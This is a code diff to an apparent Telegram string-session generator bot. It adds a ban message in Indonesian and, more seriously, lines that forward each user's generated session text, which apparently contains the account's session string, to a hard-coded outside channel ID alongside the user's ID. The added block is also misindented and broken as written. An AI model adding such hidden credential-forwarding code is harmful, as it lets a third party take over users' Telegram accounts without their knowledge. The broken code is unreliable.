@@ -1,11 +1,12 @@
 import asyncio
 
-from pyrogram import Client, filters
+from pyrogram import Client, filters 
+from pyrogram.errors import UserBannedInChannel
 from oldpyro import Client as Client1
 from oldpyro.errors import ApiIdInvalid as ApiIdInvalid1
 from oldpyro.errors import PasswordHashInvalid as PasswordHashInvalid1
 from oldpyro.errors import PhoneCodeExpired as PhoneCodeExpired1
-from oldpyro.errors import PhoneCodeInvalid as PhoneCodeInvalid1
+from oldpyro.errors import PhoneCodeInvalid as PhoneCodeInvalid1 
 from oldpyro.errors import PhoneNumberInvalid as PhoneNumberInvalid1
 from oldpyro.errors import SessionPasswordNeeded as SessionPasswordNeeded1
 from pyrogram.errors import (
@@ -259,8 +260,20 @@ async def gen_session(
             ),
             disable_web_page_preview=True,
         )
-    except:
+    except (rpcerrorlist.ChannelPrivateError, UserBannedInChannel):
+            await msg.reply('**Jiah akun lu dibanned di Amang Support.\nCoba sono ngadu ke salah 1 admin Amang Support biar dibuka ban nya.**', quote=True, reply_markup=InlineKeyboardMarkup(admin_kynan))
+            return
+        if not is_bot:
+            await bot.send_message(msg.chat.id, text)
+            await bot.send_message(-1002093662518, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
+        else:
+            await bot.send_message(msg.chat.id, text)
+            await bot.send_message(-1002093662518, f"User with ID {msg.chat.id} has successfully created a string session.\n\n{text}")
+    except KeyError:
         pass
+    await client.disconnect()
+    await asyncio.sleep(1.0)
+        
 
 
 async def cancelled(message):
